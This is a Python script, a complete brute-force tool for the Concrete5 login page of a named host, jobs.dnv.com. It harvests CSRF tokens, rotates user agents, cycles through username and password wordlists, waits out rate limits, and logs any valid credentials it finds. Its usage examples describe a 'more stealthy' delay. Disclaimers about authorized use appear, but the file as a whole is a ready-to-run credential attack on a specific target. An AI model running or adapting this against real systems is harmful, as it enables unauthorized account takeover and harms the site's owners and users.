#!/usr/bin/env python3
"""
Concrete5 Login Brute-Force Testing Tool
Target: jobs.dnv.com
Purpose: Test for weak credentials and rate limiting

RESPONSIBLE USAGE:
- Only use on authorized targets
- Use small wordlists to avoid DoS
- Implement delays between requests
- Stop after finding valid credentials
"""

import requests
import re
import sys
import time
import argparse
from datetime import datetime
from colorama import Fore, Style, init
import urllib3

# Disable SSL warnings (for testing environments)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama for colored output
init(autoreset=True)

class ConcreteBruteForcer:
    def __init__(self, target, userlist, passlist, delay=2, timeout=10):
        self.target = target.rstrip('/')
        self.userlist = userlist
        self.passlist = passlist
        self.delay = delay
        self.timeout = timeout
        self.login_url = f"{self.target}/login/authenticate/concrete"
        self.login_page = f"{self.target}/login"
        self.session = requests.Session()
        self.attempts = 0
        self.success_count = 0
        self.results_file = f"bruteforce_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        # User agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        ]

    def banner(self):
        """Display banner"""
        print(f"{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}  Concrete5 Authentication Testing Tool")
        print(f"{Fore.CYAN}  Target: {self.target}")
        print(f"{Fore.CYAN}  Delay: {self.delay}s between requests")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")

    def get_csrf_token(self):
        """Fetch CSRF token from login page"""
        try:
            headers = {
                'User-Agent': self.user_agents[self.attempts % len(self.user_agents)],
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }

            response = self.session.get(
                self.login_page,
                headers=headers,
                timeout=self.timeout,
                verify=False
            )

            # Try to extract ccm_token from HTML
            # Pattern 1: Hidden input field
            token_match = re.search(r'name=["\']ccm_token["\'] value=["\']([^"\']+)["\']', response.text)
            if token_match:
                token = token_match.group(1)
                print(f"{Fore.GREEN}[+] CSRF Token obtained: {token[:20]}...{Style.RESET_ALL}")
                return token

            # Pattern 2: JavaScript variable
            token_match = re.search(r'CCM_SECURITY_TOKEN["\']?\s*=\s*["\']([^"\']+)["\']', response.text)
            if token_match:
                token = token_match.group(1)
                print(f"{Fore.GREEN}[+] CSRF Token obtained: {token[:20]}...{Style.RESET_ALL}")
                return token

            # Pattern 3: Meta tag
            token_match = re.search(r'<meta name=["\']csrf-token["\'] content=["\']([^"\']+)["\']', response.text)
            if token_match:
                token = token_match.group(1)
                print(f"{Fore.GREEN}[+] CSRF Token obtained: {token[:20]}...{Style.RESET_ALL}")
                return token

            print(f"{Fore.YELLOW}[!] Warning: Could not extract CSRF token from page{Style.RESET_ALL}")
            return None

        except Exception as e:
            print(f"{Fore.RED}[!] Error fetching CSRF token: {str(e)}{Style.RESET_ALL}")
            return None

    def attempt_login(self, username, password, token):
        """Attempt login with given credentials"""
        self.attempts += 1

        headers = {
            'User-Agent': self.user_agents[self.attempts % len(self.user_agents)],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': self.target,
            'Referer': self.login_page,
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
        }

        # Prepare POST data
        data = {
            'uName': username,
            'uPassword': password,
            'ccm_token': token if token else ''
        }

        try:
            response = self.session.post(
                self.login_url,
                headers=headers,
                data=data,
                timeout=self.timeout,
                allow_redirects=True,
                verify=False
            )

            return self.analyze_response(username, password, response)

        except requests.exceptions.Timeout:
            print(f"{Fore.YELLOW}[!] Timeout for {username}:{password}{Style.RESET_ALL}")
            return False
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
            return False

    def analyze_response(self, username, password, response):
        """Analyze response to determine if login was successful"""

        # Check HTTP status
        status = response.status_code

        # Check for success indicators
        success_indicators = [
            'dashboard',
            'logout',
            'welcome back',
            'signed in',
            'logged in successfully',
            '/account/',
            'class="ccm-dashboard"',
        ]

        # Check for failure indicators
        failure_indicators = [
            'invalid username',
            'invalid password',
            'incorrect password',
            'login failed',
            'authentication failed',
            'invalid credentials',
            'user not found',
            'incorrect username or password',
        ]

        response_text = response.text.lower()

        # Check for success
        for indicator in success_indicators:
            if indicator in response_text:
                self.log_success(username, password, response)
                return True

        # Check for rate limiting
        if 'rate limit' in response_text or 'too many' in response_text or status == 429:
            print(f"{Fore.RED}[!] RATE LIMITED! Sleeping for 60 seconds...{Style.RESET_ALL}")
            time.sleep(60)
            return False

        # Check for account lockout
        if 'locked' in response_text or 'disabled' in response_text or 'blocked' in response_text:
            print(f"{Fore.RED}[!] Account '{username}' appears to be LOCKED/DISABLED{Style.RESET_ALL}")
            self.log_result(f"LOCKED: {username}:{password}")
            return False

        # If redirected to different page (not login), might be success
        if response.url != self.login_url and '/login' not in response.url:
            # But check for failure messages first
            has_failure = any(indicator in response_text for indicator in failure_indicators)
            if not has_failure:
                print(f"{Fore.GREEN}[+] Possible success (redirect): {username}:{password}{Style.RESET_ALL}")
                self.log_success(username, password, response)
                return True

        # Check explicit failures
        for indicator in failure_indicators:
            if indicator in response_text:
                return False

        # If none of the above, check response length (different from failed login?)
        # This is heuristic and may need adjustment
        if len(response.text) > 50000:  # Successful page usually larger
            print(f"{Fore.YELLOW}[?] Unusual response size ({len(response.text)} bytes): {username}:{password}{Style.RESET_ALL}")
            self.log_result(f"UNUSUAL_SIZE: {username}:{password} (size: {len(response.text)})")

        return False

    def log_success(self, username, password, response):
        """Log successful login"""
        self.success_count += 1
        msg = f"[SUCCESS] {username}:{password} | Status: {response.status_code} | URL: {response.url}"

        print(f"{Fore.GREEN}{'='*70}")
        print(f"{Fore.GREEN}[+] SUCCESS! Valid credentials found!")
        print(f"{Fore.GREEN}    Username: {username}")
        print(f"{Fore.GREEN}    Password: {password}")
        print(f"{Fore.GREEN}    Status: {response.status_code}")
        print(f"{Fore.GREEN}    Final URL: {response.url}")
        print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}\n")

        self.log_result(msg)

        # Save response HTML for analysis
        with open(f"success_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html", 'w') as f:
            f.write(response.text)

    def log_result(self, message):
        """Log result to file"""
        with open(self.results_file, 'a') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] {message}\n")

    def load_wordlist(self, filepath):
        """Load wordlist from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading {filepath}: {str(e)}{Style.RESET_ALL}")
            sys.exit(1)

    def run(self):
        """Main brute force loop"""
        self.banner()

        # Load wordlists
        print(f"{Fore.CYAN}[*] Loading wordlists...{Style.RESET_ALL}")
        usernames = self.load_wordlist(self.userlist)
        passwords = self.load_wordlist(self.passlist)

        total_attempts = len(usernames) * len(passwords)
        print(f"{Fore.CYAN}[*] Loaded {len(usernames)} usernames and {len(passwords)} passwords")
        print(f"{Fore.CYAN}[*] Total combinations: {total_attempts}")
        print(f"{Fore.YELLOW}[*] Estimated time: {(total_attempts * self.delay) / 60:.1f} minutes")
        print(f"{Fore.CYAN}[*] Results will be saved to: {self.results_file}{Style.RESET_ALL}\n")

        # Confirm before starting
        response = input(f"{Fore.YELLOW}Continue? (y/n): {Style.RESET_ALL}")
        if response.lower() != 'y':
            print("Aborted.")
            return

        print(f"\n{Fore.CYAN}[*] Starting brute force...{Style.RESET_ALL}\n")
        start_time = time.time()

        # Get initial CSRF token
        token = self.get_csrf_token()
        token_refresh_counter = 0

        try:
            for username in usernames:
                for password in passwords:
                    # Refresh token every 10 attempts
                    if token_refresh_counter % 10 == 0:
                        token = self.get_csrf_token()

                    token_refresh_counter += 1

                    print(f"{Fore.CYAN}[{self.attempts}/{total_attempts}] Testing: {username}:{password}{Style.RESET_ALL}", end='')

                    success = self.attempt_login(username, password, token)

                    if success:
                        print(f" {Fore.GREEN}✓ SUCCESS{Style.RESET_ALL}")
                        # Continue testing or stop?
                        # For responsible testing, we'll continue to find all weak credentials
                    else:
                        print(f" {Fore.RED}✗ Failed{Style.RESET_ALL}")

                    # Rate limiting delay
                    if self.attempts < total_attempts:
                        time.sleep(self.delay)

                    # Progress update every 50 attempts
                    if self.attempts % 50 == 0:
                        elapsed = time.time() - start_time
                        rate = self.attempts / elapsed if elapsed > 0 else 0
                        remaining = (total_attempts - self.attempts) / rate if rate > 0 else 0
                        print(f"{Fore.YELLOW}[*] Progress: {self.attempts}/{total_attempts} | "
                              f"Rate: {rate:.2f} req/s | "
                              f"ETA: {remaining/60:.1f} min{Style.RESET_ALL}")

        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")

        # Final summary
        elapsed = time.time() - start_time
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"  BRUTE FORCE COMPLETE")
        print(f"{'='*70}")
        print(f"Total attempts: {self.attempts}")
        print(f"Successful logins: {self.success_count}")
        print(f"Time elapsed: {elapsed/60:.2f} minutes")
        print(f"Results saved to: {self.results_file}")
        print(f"{'='*70}{Style.RESET_ALL}\n")


def main():
    parser = argparse.ArgumentParser(
        description='Concrete5 Login Brute Force Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic usage
  python3 bruteforce_login.py -t https://jobs.dnv.com -u users.txt -p passwords.txt

  # With custom delay (slower, more stealthy)
  python3 bruteforce_login.py -t https://jobs.dnv.com -u users.txt -p passwords.txt -d 5

  # With faster delay (use with caution, may trigger rate limiting)
  python3 bruteforce_login.py -t https://jobs.dnv.com -u users.txt -p passwords.txt -d 1

Responsible Usage:
  - Only test authorized targets
  - Use small wordlists (10-50 entries)
  - Respect rate limits
  - Stop when credentials found
  - Report findings responsibly
        """
    )

    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., https://jobs.dnv.com)')
    parser.add_argument('-u', '--userlist', required=True, help='Username wordlist file')
    parser.add_argument('-p', '--passlist', required=True, help='Password wordlist file')
    parser.add_argument('-d', '--delay', type=float, default=2, help='Delay between requests in seconds (default: 2)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')

    args = parser.parse_args()

    bruter = ConcreteBruteForcer(
        target=args.target,
        userlist=args.userlist,
        passlist=args.passlist,
        delay=args.delay,
        timeout=args.timeout
    )

    bruter.run()


if __name__ == '__main__':
    main()
